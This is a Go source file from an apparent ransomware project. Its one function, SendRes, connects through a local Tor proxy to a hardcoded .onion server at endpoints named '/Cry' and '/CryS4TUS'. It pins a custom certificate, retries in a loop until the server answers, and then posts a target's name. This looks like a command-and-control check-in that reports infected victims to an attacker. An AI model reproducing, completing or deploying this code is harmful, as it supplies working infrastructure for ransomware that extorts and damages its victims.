package networking

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const torProxy = "socks5://127.0.0.1:9050"

// SendRes -> Sends the status response to the server
func SendRes(targetName string) {
	nameReader := strings.NewReader(targetName)
	torProxyURL, err := url.Parse(torProxy)

	if err != nil {
		log.Fatal(err)
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(*trustedCert)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			RootCAs: caCertPool,
		},
		Proxy: http.ProxyURL(torProxyURL),
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Second * 60,
	}

	for {
		r, err := client.Get("https://zjb2hvb6ogs4mwbw.onion:4040/Cry")

		if err == nil {
			defer r.Body.Close()

			res, err := client.Post("https://zjb2hvb6ogs4mwbw.onion:4040/CryS4TUS", "text/plain", nameReader)

			if err != nil {
				log.Fatal(err)
			}

			defer res.Body.Close()
			return
		}
	}
}
